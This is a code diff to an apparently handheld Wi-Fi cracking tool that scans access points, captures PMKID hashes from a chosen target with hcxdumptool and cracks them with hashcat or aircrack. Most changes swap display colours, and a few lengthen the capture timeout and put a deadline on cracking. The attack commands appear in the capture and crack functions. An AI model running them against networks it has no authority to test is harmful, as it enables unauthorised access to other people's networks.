@@ -82,7 +82,7 @@ def draw(lines, title="KTOx CRACK", title_color="#8B0000", text_color="#FFBBBB")
     img = Image.new("RGB", (W, H), "#0A0000")
     d = ImageDraw.Draw(img)
     d.rectangle((0, 0, W, 17), fill=title_color)
-    d.text((4, 3), title[:20], font=f9, fill="#FF3333")
+    d.text((4, 3), title[:20], font=f9, fill=(231, 76, 60))
     y = 20
     for line in lines[:7]:
         d.text((4, y), line[:23], font=f9, fill=text_color)
@@ -94,8 +94,8 @@ def draw(lines, title="KTOx CRACK", title_color="#8B0000", text_color="#FFBBBB")
 def draw_signal(draw_obj, x, y, dbm):
     length = int((dbm + 90) / 60 * 24)
     length = max(0, min(24, length))
-    draw_obj.rectangle((x, y, x+length, y+6), fill="#00FF00")
-    draw_obj.rectangle((x+length, y, x+24, y+6), fill="#333")
+    draw_obj.rectangle((x, y, x+length, y+6), fill=(30, 132, 73))
+    draw_obj.rectangle((x+length, y, x+24, y+6), fill=(34, 0, 0))
     draw_obj.text((x+26, y-1), str(dbm), font=f9, fill="#AAA")
 
 def wait_btn(timeout=0.1):
@@ -166,7 +166,7 @@ def browse_file(start="/", exts=[".txt"]):
             img = Image.new("RGB", (W, H), "#0A0000")
             d = ImageDraw.Draw(img)
             d.text((4, 50), "Empty folder", font=f9, fill="#FF8888")
-            d.text((4, 70), "K3 to go back", font=f9, fill="#888")
+            d.text((4, 70), "K3 to go back", font=f9, fill=(113, 125, 126))
             LCD.LCD_ShowImage(img, 0, 0)
             while True:
                 btn = get_btn()
@@ -270,10 +270,10 @@ def scan_aps_debug(mon):
                 img = Image.new("RGB", (W, H), "#0A0000")
                 d = ImageDraw.Draw(img)
                 d.rectangle((0, 0, W, 17), fill="#8B0000")
-                d.text((4, 3), "LIVE SCAN", font=f9, fill="#FF3333")
+                d.text((4, 3), "LIVE SCAN", font=f9, fill=(231, 76, 60))
                 y = 20
                 for l in lines_to_show[-6:]:
-                    d.text((4, y), l[:23], font=f9, fill="#FFBBBB")
+                    d.text((4, y), l[:23], font=f9, fill=(171, 178, 185))
                     y += 12
                 d.rectangle((0, H-12, W, H), fill="#220000")
                 d.text((4, H-10), "Scanning...", font=f9, fill="#FF7777")
@@ -350,7 +350,7 @@ def capture_pmkid(mon, bssid, ch, essid):
     os.makedirs(out, exist_ok=True)
     pcapng = os.path.join(out, "capture.pcapng")
     draw(["PMKID capture", f"ESSID: {essid[:16]}", "Using hcxdumptool..."])
-    run(f"hcxdumptool -i {mon} -o {pcapng} -c {ch} --filterlist={bssid} --filtermode=2", timeout=30)
+    run(f"hcxdumptool -i {mon} -o {pcapng} -c {ch} --filterlist={bssid} --filtermode=2", timeout=120)
     hashfile = os.path.join(out, "pmkid.16800")
     run(f"hcxpcaptool -z {hashfile} {pcapng}")
     if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
@@ -369,8 +369,10 @@ def crack_hashcat(hash_file, mode, wordlist, essid):
     cmd = f"hashcat -m {mode} {hash_file} {wordlist} --force --status --status-timer=5 --potfile-disable"
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     pwd = None
+    deadline = time.time() + 300
     try:
-        for line in iter(proc.stdout.readline, ''):
+        while time.time() < deadline and proc.poll() is None:
+            line = proc.stdout.readline()
             if not line:
                 break
             if "STATUS" in line:
@@ -382,9 +384,11 @@ def crack_hashcat(hash_file, mode, wordlist, essid):
                 if len(parts) >= 2:
                     pwd = parts[-1]
                     break
-        proc.wait(timeout=2)
-    except:
-        proc.terminate()
+    except (OSError, IOError):
+        pass
+    finally:
+        if proc.poll() is None:
+            proc.terminate()
     return pwd
 
 def crack_aircrack(cap, wordlist):
@@ -470,10 +474,10 @@ def main():
         img = Image.new("RGB", (W, H), "#0A0000")
         d = ImageDraw.Draw(img)
         d.rectangle((0, 0, W, 17), fill="#8B0000")
-        d.text((4, 3), "SELECT TARGET", font=f9, fill="#FF3333")
+        d.text((4, 3), "SELECT TARGET", font=f9, fill=(231, 76, 60))
         y = 20
         for i, line in enumerate(lines):
-            d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
+            d.text((4, y), line[:23], font=f9, fill=(171, 178, 185))
             if i == 2:
                 draw_signal(d, 80, y, sig)
             y += 12
